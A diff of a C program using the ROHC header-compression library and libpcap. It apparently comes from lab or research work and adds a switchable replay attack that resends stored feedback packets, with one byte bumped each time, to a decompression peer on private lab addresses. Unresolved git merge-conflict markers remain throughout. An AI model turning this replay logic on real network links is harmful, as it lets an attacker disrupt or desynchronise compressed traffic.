@@ -14,6 +14,11 @@
 #include <rohc/rohc_decomp.h>
 #include <rohc/rohc_time.h>
 
+<<<<<<< HEAD
+=======
+#define REPLAY_ATTACK "yes"
+
+>>>>>>> 8275539a3bfb9d2d561d7c3123e7400c6574c247
 #define FEEDBACKPORT "3495"
 #define BUFFER_SIZE 2048
 /* default snap length (maximum bytes per packet to capture) */
@@ -198,7 +203,11 @@ void send_feedback(struct rohc_buf feedback,int actual){
 	struct addrinfo hints, *servinfo, *p;
 	int rv;
 	int numbytes;
+<<<<<<< HEAD
 	char *address = "10.2.75.124";
+=======
+	char *address = "192.168.0.100";
+>>>>>>> 8275539a3bfb9d2d561d7c3123e7400c6574c247
 
 	memset(&hints, 0, sizeof hints);
 	hints.ai_family = AF_UNSPEC;
@@ -300,7 +309,18 @@ error:
 
 }
 
+<<<<<<< HEAD
 int DecompressPacket(const char *payload, int size_payload){
+=======
+unsigned char replay_feedback_buffer[BUFFER_SIZE];
+struct rohc_buf replay_feedback = rohc_buf_init_empty(replay_feedback_buffer,BUFFER_SIZE);
+
+int DecompressPacket(const char *payload, int size_payload){
+	static int init_count = 0;
+	if(init_count != 0 && !rohc_buf_is_empty(replay_feedback))
+		replay_feedback.data[5] += 1;
+
+>>>>>>> 8275539a3bfb9d2d561d7c3123e7400c6574c247
 	printf("Attempting to Decompress, IN O_MODE\n");
 
 	/*Fill the rohc buffer with recieved compressed packet*/
@@ -345,11 +365,30 @@ int DecompressPacket(const char *payload, int size_payload){
 
 		if(!rohc_buf_is_empty(feedback_send)){
 			printf("YOYOYOYO WE GOT ONE FRESHLY BAKED FEEDBACK\n");
+<<<<<<< HEAD
 			send_feedback(feedback_send,1);	
 		}
 		else{
 			printf("NO FEEDBACK TO SEND, WHATDO?\n");
 			send_feedback(feedback_send,0);
+=======
+			if(rohc_buf_is_empty(replay_feedback))
+				rohc_buf_append_buf (&replay_feedback,feedback_send);
+			
+			#ifdef REPLAY_ATTACK
+			send_feedback(replay_feedback,1);
+			#else
+			send_feedback(feedback_send,1);	
+			#endif
+		}
+		else{
+			printf("NO FEEDBACK TO SEND, WHATDO?\n");
+			#ifdef REPLAY_ATTACK
+			send_feedback(replay_feedback,1);
+			#else
+			send_feedback(feedback_send,0);
+			#endif
+>>>>>>> 8275539a3bfb9d2d561d7c3123e7400c6574c247
 		}
 	}
 	else
@@ -360,7 +399,12 @@ int DecompressPacket(const char *payload, int size_payload){
 		goto release_decompressor;
 		//! [decompress ROHC packet #3]
 	}
+<<<<<<< HEAD
 
+=======
+	
+	init_count++;
+>>>>>>> 8275539a3bfb9d2d561d7c3123e7400c6574c247
 	return 0;
 
 release_decompressor:
@@ -483,12 +527,24 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 
 int main(int argc, char **argv)
 {
+<<<<<<< HEAD
+=======
+	#ifdef REPLAY_ATTACK
+	printf("Attack using replay attack\n");
+	#else
+	printf("Normal Attack\n");
+	#endif
+>>>>>>> 8275539a3bfb9d2d561d7c3123e7400c6574c247
 	CreateDecompressor();
 	char *dev = NULL;			/* capture device name */
 	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
 	pcap_t *handle;				/* packet capture handle */
 
+<<<<<<< HEAD
 	char filter_exp[] = "host 10.2.75.124 and port 3490";		/* filter expression [3] */
+=======
+	char filter_exp[] = "host 192.168.0.100 and port 3490";		/* filter expression [3] */
+>>>>>>> 8275539a3bfb9d2d561d7c3123e7400c6574c247
 	struct bpf_program fp;			/* compiled filter program (expression) */
 	bpf_u_int32 mask;			/* subnet mask */
 	bpf_u_int32 net;			/* ip */
